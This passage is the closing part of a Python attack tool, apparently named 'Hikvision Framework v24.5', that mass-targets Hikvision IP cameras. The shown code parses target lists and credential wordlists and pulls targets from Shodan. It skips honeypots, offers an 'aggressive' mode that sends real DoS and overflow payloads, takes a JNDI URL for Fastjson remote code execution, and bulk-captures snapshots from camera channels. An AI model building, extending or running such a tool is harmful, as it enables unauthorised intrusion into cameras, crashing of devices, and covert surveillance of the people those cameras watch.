        print(f'  Confirmed:         {conf}')
        print(f'  Probable:          {prob}')
        print(f'  Detection only:    {total - conf - prob}')
        print(f'Critical (CVSS>=9):  {crit}')
        print(f'Unique snapshots:    {snaps}')
        print(f'Honeypots skipped:   {sum(1 for v in self.honeypot_flags.values() if v)}')
        print(f'HTML report:         {os.path.abspath(self.output_html)}')
        print('='*60)


def parse_targets(s):
    out = []
    if os.path.isfile(s):
        with open(s) as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith('#'):
                    if ':' in line and not re.match(r'^[0-9a-fA-F:]+$', line):
                        h, p = line.rsplit(':', 1)
                        try: out.append((h, int(p)))
                        except ValueError: out.append((line, 80))
                    else: out.append((line, 80))
    else:
        if ':' in s and not re.match(r'^[0-9a-fA-F:]+$', s):
            h, p = s.rsplit(':', 1)
            try: out.append((h, int(p)))
            except ValueError: out.append((s, 80))
        else: out.append((s, 80))
    return out


def load_wordlist(path):
    if not path or not os.path.isfile(path): return None
    creds = []
    with open(path, encoding='utf-8', errors='ignore') as f:
        for line in f:
            line = line.strip()
            if not line or line.startswith('#'): continue
            if ':' in line:
                u, p = line.split(':', 1); creds.append((u.strip(), p.strip()))
            else: creds.append(('admin', line))
    return creds or None


def main():
    global AGGRESSIVE_MODE, JNDI_URL
    ap = argparse.ArgumentParser(
        description='Hikvision Framework v24.5',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s -t targets.txt --auto-hunt --threads 20
  %(prog)s -t targets.txt --https --auto-hunt
  %(prog)s -t targets.txt --aggressive --auto-hunt
  %(prog)s -t 192.168.1.100 --snapshot-only -u admin -p 12345
        """)
    ap.add_argument('-t','--targets', help='IP, IP:PORT, or file')
    ap.add_argument('--threads', type=int, default=5)
    ap.add_argument('--proxy')
    ap.add_argument('--output-html', default='report.html')
    ap.add_argument('--output-json', default='results.json')
    ap.add_argument('--list-modules', action='store_true')
    ap.add_argument('--list-families', action='store_true')
    ap.add_argument('--modules', help='Comma-separated modules')
    ap.add_argument('--only-check', action='store_true')
    ap.add_argument('--timeout', type=int, default=5)
    ap.add_argument('--no-auto-hunt', action='store_true')
    ap.add_argument('--family')
    ap.add_argument('--wordlist')
    ap.add_argument('--shodan-query'); ap.add_argument('--shodan-key')
    ap.add_argument('--shodan-pages', type=int, default=1)
    ap.add_argument('--https', action='store_true')
    ap.add_argument('--delay', type=float, default=0.0)
    ap.add_argument('--diff', action='store_true')
    ap.add_argument('--no-honeypot-skip', action='store_true')
    ap.add_argument('--jsonl', action='store_true')
    ap.add_argument('--channels', help='Custom channels (e.g. "101,201")')
    ap.add_argument('--snapshot-workers', type=int, default=6)
    ap.add_argument('--snapshot-only', action='store_true')
    ap.add_argument('-u', '--user'); ap.add_argument('-p', '--password')
    ap.add_argument('--aggressive', action='store_true', help='Send real DoS/overflow payloads')
    ap.add_argument('--jndi-url', help='JNDI URL for Fastjson RCE')
    args = ap.parse_args()

    AGGRESSIVE_MODE = args.aggressive
    JNDI_URL = args.jndi_url
    if AGGRESSIVE_MODE:
        log.warning('AGGRESSIVE MODE — devices may crash!')

    add_file_log('scan.log')
    wordlist = load_wordlist(args.wordlist)
    mgr = ModuleManager(wordlist=wordlist)

    if args.list_modules: mgr.list_modules(); return
    if args.list_families: mgr.list_families(); return

    targets = []
    if args.targets: targets += parse_targets(args.targets)
    if args.shodan_query:
        if not args.shodan_key: ap.error('--shodan-key required')
        targets += fetch_shodan_targets(args.shodan_query, args.shodan_key, args.shodan_pages)
    if not targets: ap.error('No targets.')

    custom_channels = [c.strip() for c in args.channels.split(',') if c.strip()] if args.channels else None

    if args.snapshot_only:
        if not args.user or not args.password: ap.error('--snapshot-only requires -u and -p')
        http = HttpClient(proxy=args.proxy, use_https=args.https, delay=args.delay, timeout=args.timeout)
        all_results = []
        for host, port in targets:
            log.info(f'Target: {host}:{port}')
            sm = SnapshotManager(host, port, args.user, args.password, http,
                                 custom_channels=custom_channels,
                                 max_workers=args.snapshot_workers,
                                 manifest_suffix=f"{host.replace('.', '_')}_{port}")
            snaps = sm.capture_all()
            all_results.append({
                'host': host, 'port': port,
                'findings': [{'cve':'N/A','type':'snapshot','success':True,'vulnerable':True,
                              'confidence':'confirmed',
                              'username':args.user,'password':args.password,
                              'snapshots':snaps,
                              'description':f'{len(snaps)} channel(s)','evidence':[]}] if snaps else [],
            })
        with open(args.output_json, 'w', encoding='utf-8') as f:
            json.dump(all_results, f, indent=2, ensure_ascii=False, default=str)
        generate_html_report(all_results, {}, {}, args.output_html)
        return

    mods = args.modules.split(',') if args.modules else None
    runner = BatchRunner(
        targets=targets, modules=mods, threads=args.threads, timeout=args.timeout,
        proxy=args.proxy, output_html=args.output_html, output_json=args.output_json,
        only_check=args.only_check, auto_hunt=not args.no_auto_hunt, wordlist=wordlist,
        use_https=args.https, delay=args.delay,
        model_aware=True, forced_family=args.family,
        skip_honeypots=not args.no_honeypot_skip, jsonl=args.jsonl,
        custom_channels=custom_channels, snapshot_workers=args.snapshot_workers,
    )
    runner.run()
    if args.diff: diff_scan(runner.results)


if __name__ == '__main__':
    main()